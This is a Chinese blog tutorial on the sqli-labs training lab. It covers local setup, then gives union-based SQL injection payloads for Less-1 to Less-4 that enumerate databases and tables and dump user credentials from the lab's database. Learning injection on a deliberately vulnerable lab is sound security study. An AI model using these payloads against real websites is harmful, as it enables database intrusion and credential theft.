{"blogid": "124049039", "writerAge": "码龄1年", "writerBlogNum": "25", "writerCollect": "56", "writerComment": "13", "writerFan": "7", "writerGrade": "2级", "writerIntegral": "351", "writerName": "清丶酒孤欢ゞ", "writerProfileAdress": "writer_image\\profile_124049039.jpg", "writerRankTotal": "48898", "writerRankWeekly": "493891", "writerThumb": "37", "writerVisitNum": "22123", "blog_read_count": "3482", "blog_time": "已于 2022-04-09 22:07:47 修改", "blog_title": "SQL注入之sqli-labs", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p></p>\n<p id=\"main-toc\"><strong>目录</strong></p>\n<p id=\"%EF%BC%88%E4%B8%80%EF%BC%89%E6%90%AD%E5%BB%BA%20sqli-labs%20%E9%9D%B6%E5%9C%BA-toc\" style=\"margin-left:0px;\"><a href=\"#%EF%BC%88%E4%B8%80%EF%BC%89%E6%90%AD%E5%BB%BA%20sqli-labs%20%E9%9D%B6%E5%9C%BA\">（一）搭建 sqli-labs 靶场</a></p>\n<p id=\"%EF%BC%88%E4%BA%8C%EF%BC%89%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-toc\" style=\"margin-left:0px;\"><a href=\"#%EF%BC%88%E4%BA%8C%EF%BC%89%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86\">（二）一些基础知识</a></p>\n<p id=\"%EF%BC%88%E4%BA%8C%EF%BC%89sqli-labs%E7%9A%84%E7%AC%AC%E4%B8%80%E5%85%B3%E8%87%B3%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%94%E8%AE%B0-toc\" style=\"margin-left:0px;\"><a href=\"#%EF%BC%88%E4%BA%8C%EF%BC%89sqli-labs%E7%9A%84%E7%AC%AC%E4%B8%80%E5%85%B3%E8%87%B3%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%94%E8%AE%B0\">（三）sqli-labs的第一关至第四关笔记</a></p>\n<p id=\"%EF%BC%881%EF%BC%89%E7%AC%AC%E4%B8%80%E5%85%B3%C2%A0-toc\" style=\"margin-left:40px;\"><a href=\"#%EF%BC%881%EF%BC%89%E7%AC%AC%E4%B8%80%E5%85%B3%C2%A0\">（1）第一关 </a></p>\n<p id=\"%EF%BC%882%EF%BC%89%E7%AC%AC%E4%BA%8C%E5%85%B3-toc\" style=\"margin-left:40px;\"><a href=\"#%EF%BC%882%EF%BC%89%E7%AC%AC%E4%BA%8C%E5%85%B3\">（2）第二关</a></p>\n<p id=\"%EF%BC%883%EF%BC%89%E7%AC%AC%E4%B8%89%E5%85%B3-toc\" style=\"margin-left:40px;\"><a href=\"#%EF%BC%883%EF%BC%89%E7%AC%AC%E4%B8%89%E5%85%B3\">（3）第三关</a></p>\n<p id=\"%EF%BC%884%EF%BC%89%E7%AC%AC%E5%9B%9B%E5%85%B3-toc\" style=\"margin-left:40px;\"><a href=\"#%EF%BC%884%EF%BC%89%E7%AC%AC%E5%9B%9B%E5%85%B3\">（4）第四关</a></p>\n<hr id=\"hr-toc\"/>\n<p></p>\n<p>sqli-labs 是一款基于 sql 注入的游戏教程，有利于更好地了解 sql 注入的语法。</p>\n<h1 id=\"%EF%BC%88%E4%B8%80%EF%BC%89%E6%90%AD%E5%BB%BA%20sqli-labs%20%E9%9D%B6%E5%9C%BA\" style=\"text-align:center;\"><strong>（一）搭建 sqli-labs 靶场</strong></h1>\n<p>搭建 sqli-labs 靶场前首先要下载 phpstudy</p>\n<p>phpstudy下载链接：<a class=\"link-info\" href=\"https://www.xp.cn\" title=\"https://www.xp.cn\">https://www.xp.cn</a></p>\n<p>要保证安装路径中不能有空格和中文。</p>\n<p>下载完成后：</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\5a47949b8c744a028dd918a55c28edcc.png\"/></p>\n<p></p>\n<p>可以对 root 数据库进行修改密码或创建数据库，然后在软件管理里面下载 php 5.6.9，因为sqli-labs不支持php7以上的版本，所以需要下载5.x版本</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\10378a9549434f4bb3a353bf9f81e74f.png\"/></p>\n<p></p>\n<p>sqli-labs 项目的下载地址为：<a class=\"link-info\" href=\"https://github.com/Audi-1/sqli-labs\" title=\"https://github.com/Audi-1/sqli-labs\">https://github.com/Audi-1/sqli-labs</a></p>\n<p>有些朋友如果无法打开Github可以参考这篇文章：<a href=\"https://www.cnblogs.com/kongbaii/p/15475051.html\" title=\"解决windows10访问github官网进不去的问题 - 空_白/ - 博客园 (cnblogs.com)\">解决windows10访问github官网进不去的问题 - 空_白/ - 博客园 (cnblogs.com)</a></p>\n<p>进入后点击</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\e3375125ef2a4191ae1f6d4d709563bf.png\"/></p>\n<p>进行下载。</p>\n<p>下载完成后，将之前下载的源码解压到web目录下，windows下的phpstuudy解压在www目录下。</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\ae9aa159b7124ea39ebf6ca9742e679a.png\"/></p>\n<p>接着修改sqli-labs里面的账号密码 </p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\dcfd66528aa443c994c9138c63c8021e.png\"/></p>\n<p>右键 db-creds.inc 选择编辑模式 ，修改密码</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\7c09c4e2bc244a67a21a83e826da4cb4.png\"/></p>\n<p>这里的密码就是phpstudy 里面数据库的账号密码，如果没有改动就是root</p>\n<p>启动主页面的 apache 和 mysql</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\f5410ebd1676486d84c2b784f21ad1d0.png\"/></p>\n<p>如果都变绿了就代表成功了。</p>\n<p>打开谷歌输入 <a href=\"http://127.0.0.1/sqli-labs-master/\" title=\"http://127.0.0.1/sqli-labs-master/\">http://127.0.0.1/sqli-labs-master/</a></p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\2e532d731dcc4fd4a7dfd2d1a1010ab5.png\"/></p>\n<p>点第一个创建数据库，注意如果你的php版本不是5.x会出错！！！</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\b09fe4ec479d41c3a8843ec2c546f641.png\"/></p>\n<p>如果出现的页面如图所示就代表创建成功了。</p>\n<p> 这里推荐一个Google的插件hackbar，比较好用，当然直接在搜索栏改也可以的。</p>\n<p><a href=\"https://www.cnblogs.com/cainiao-chuanqi/p/14016644.html\" title=\"谷歌与火狐Hackbar插件下载与安装 - 菜鸟-传奇 - 博客园 (cnblogs.com)\">谷歌与火狐Hackbar插件下载与安装 - 菜鸟-传奇 - 博客园 (cnblogs.com)</a></p>\n<p>好了，准备工作做好了可以开始第一关的练习了。<br/>  </p>\n<h1 id=\"%EF%BC%88%E4%BA%8C%EF%BC%89%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86\" style=\"text-align:center;\"><strong>（二）一些基础知识</strong></h1>\n<p><strong>（1）如何进入 mysql 界面？</strong></p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\b3fafc08cf604eb38727756ffb7ff467.png\"/></p>\n<p>点击 mysql </p>\n<p>在 MySQL 文件里进入 bin，打开 cmd命令行，调到当前页面输入 mysql -u root -p，然后回车</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\e8922177934b437c8441e3e36bed8e38.png\"/></p>\n<p>输入自己的密码回车，进入 mysql 命令行 </p>\n<pre><code>所有mysql执行语句后面都要加\";\"\n\n进入后可以先看数据库名称：show databases;\n切换数据库：use security;\n\nmysql里的元数据库：information_schema #用于存放mysql的所有数据\n\nmysql里的元数据表：table 表：主要是记录 Mysql 当中的所库及所有表，表的字段 table_schema（用于记录库名）table_name（用于记录表名）\n\n\nmysql简单基本用法：\n查库：select schema_name from information_schema.schemata\n查表：select table_name from information_schema.tables where table_schema=\"security\"\n查列：select column_name from information_schema.columns where table_name=\"users\"\n查字段：select username,password from security.users\n</code></pre>\n<h1 style=\"text-align:center;\"></h1>\n<h1 id=\"%EF%BC%88%E4%BA%8C%EF%BC%89sqli-labs%E7%9A%84%E7%AC%AC%E4%B8%80%E5%85%B3%E8%87%B3%E7%AC%AC%E5%9B%9B%E5%85%B3%E7%AC%94%E8%AE%B0\" style=\"text-align:center;\"><strong>（三）sqli-labs的第一关至第四关笔记</strong></h1>\n<p style=\"text-align:center;\"><strong><img alt=\"\" src=\"image\\372757d66c6b41f2ba80bd8e2f191b55.png\"/></strong></p>\n<h2 id=\"%EF%BC%881%EF%BC%89%E7%AC%AC%E4%B8%80%E5%85%B3%C2%A0\">（1）第一关 </h2>\n<p>（新手：为了便于新手更加直观的看到 sql 注入的语句</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\e5dbf720bdc9463bb95e38240288e87c.png\"/></p>\n<p>编辑php文件：</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\febda057201b43bbb3c18c7938854f79.png\"/></p>\n<p> 在sql 语句下面加入两句：</p>\n<pre><code>echo $sql;\t\t# 将构造的 sql 语句进行输出\necho \"&lt;br&gt;\";\t# 换行输出</code></pre>\n<p>这样在页面中会显示你的 sql 注入语句，十分清晰。以后每关都可以这样修改）</p>\n<p>来到第一关：</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\2376bfd2c9084c0eb1e078e678c58f7d.png\"/></p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\99f47e9802e54e3ab5bf786fe9283a07.png\"/></p>\n<p>输入不同的id值发现页面中回显的内容不同，说明存在注入漏洞，再判断漏洞类型：</p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=2'</code></pre>\n<p style=\"text-align:center;\"> <img alt=\"\" src=\"image\\e959ddf6730645328c669898d9ea6cba.png\"/></p>\n<p> 发现下面一行报错信息中判断为数字型注入，再输入</p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=2'--+</code></pre>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\2d2fe2127a1248d59d1448b7d305ff8d.png\"/></p>\n<p> 是因为“--+”这个符号代表注释的意思，表示将“--+”后面的语句注释掉了，不再执行。</p>\n<p>再来判断字段数：</p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=2' order by 1--+\nhttp://127.0.0.1/sqli-labs-master/Less-1/?id=2' order by 2--+\nhttp://127.0.0.1/sqli-labs-master/Less-1/?id=2' order by 3--+\nhttp://127.0.0.1/sqli-labs-master/Less-1/?id=2' order by 4--+</code></pre>\n<p>依次执行，发现到4的时候报错</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\89f59bb30c7d4bba91b7688075d2c87a.png\"/></p>\n<p>说明字段数为3，即有3列。</p>\n<p>可以在 mysql 命令行中看一下：</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\5eb5f758891d460c82c627a3f732deaf.png\"/></p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\7c316405fb814b0b8e3a4164455173f0.png\"/></p>\n<p style=\"text-align:center;\"> <img alt=\"\" src=\"image\\085e6094c5ce44a3a9448d85521bd539.png\"/></p>\n<p> 对比上面两张图可以发现，按第一列排和按第二列排有明显的区别</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\18880b7c95a84ad8a6f8eebb2c1bc5b9.png\"/></p>\n<p>所以可以看出有3列。</p>\n<p> 之后使用联合查询：</p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=2' union select 1,2,3--+</code></pre>\n<p><img alt=\"\" src=\"image\\95291bff231d40cebf53ea644327c844.png\"/></p>\n<p></p>\n<p>发现页面数据没有变化，应该将前面的id值改为一个不存在的值，比如-1 </p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\bd2f264f09ba4baa9e4b3c17b7ada654.png\"/></p>\n<p>从返回的结果看到这两个有回显，可以利用。</p>\n<p>查库：</p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,2,schema_name from information_schema.schemata--+</code></pre>\n<p>这里选择的回显位置是3，所以把3替换掉了，2也可以作为回显位置。</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\26fbddd1c808469fa87082006f7e17dc.png\"/></p>\n<p></p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=-1'  union select 1,2,schema_name from information_schema.schemata limit 1,1--+</code></pre>\n<p>在后面加上limit之后输出不同的库名，比如</p>\n<pre><code>limit 0,1--+    mysql\nlimit 1,1--+    information_schema\nlimit 2,1--+    performance_schema</code></pre>\n<p>等等。</p>\n<p>但是这种方法太慢了，可以使用一个函数 group_concat() 快速获取</p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=-1'  union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></pre>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\ef415b8ec277486f867cdff267bba9b8.png\"/></p>\n<p>我们要取 security 库中的表</p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\"security\"--+</code></pre>\n<p>where 语句对其进行限定，这里不建议使用“security”，因为会引入引号等问题，推荐使用16进制</p>\n<p>16进制前面要加上0x，后面的security可以在hackbar中</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\4a4515d1564449cd8264589fb5342c94.png\"/></p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code></pre>\n<p> 最后执行结果相同。</p>\n<p>接下来取users表里面的数据</p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code></pre>\n<p>爆数据</p>\n<p>这里推荐另一个函数，concat_ws(\"\",A,B)，最后的输出形式为 A~B，有利于用户名和密码对应。</p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-1/?id=-1' union select 1,2,group_concat(concat_ws(\"~\",username,password)) from security.users--+</code></pre>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\70aba74255f547158462097639d4223e.png\"/></p>\n<p> 结合一下两个函数可以很清晰的看到结果。</p>\n<p>同样，这里也推荐将“~”改为16进制：0x7e</p>\n<p>到此为止，第一关通过。</p>\n<p>建议将第一关弄懂后再看下面两关，会非常简单</p>\n<h2 id=\"%EF%BC%882%EF%BC%89%E7%AC%AC%E4%BA%8C%E5%85%B3\"><strong>（2）第二关</strong></h2>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1</code></pre>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1’</code></pre>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\0323dc3c116443f3bd1a71fe02b45e4c.png\"/></p>\n<p>可以看出是数字型注入。因为没有引号，所以后面不需要“--+”来注释</p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=1 order by 4</code></pre>\n<p style=\"text-align:center;\"> <img alt=\"\" src=\"image\\f60c8e86dc1c4f649cd95921522eb478.png\"/></p>\n<p> 同样为3列。</p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,2,3</code></pre>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\5f66e97a40d74dfc99a93c14adc6cd67.png\"/></p>\n<p></p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,2,group_concat(schema_name) from information_schema.schemata</code></pre>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479</code></pre>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-2/?id=-1 union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users</code></pre>\n<h2 id=\"%EF%BC%883%EF%BC%89%E7%AC%AC%E4%B8%89%E5%85%B3\"><strong>（3）第三关</strong></h2>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-3/?id=1</code></pre>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-3/?id=1')--+</code></pre>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\a673587d9b1a4ec5b83da98de05f7f8b.png\"/></p>\n<p>将后面的“）”注释后，就可以执行中间的语句了。</p>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-3/?id=1') order by 4--+</code></pre>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-3/?id=-1') union select 1,2,3--+</code></pre>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-3/?id=-1') union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></pre>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-3/?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code></pre>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-3/?id=-1') union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users--+</code></pre>\n<h2 id=\"%EF%BC%884%EF%BC%89%E7%AC%AC%E5%9B%9B%E5%85%B3\"><strong>（4）第四关</strong></h2>\n<pre><code>http://127.0.0.1/sqli-labs-master/Less-4/?id=1\") order by 4--+</code></pre>\n<p>后面的和之前一个套路</p>\n</div>\n</div>"}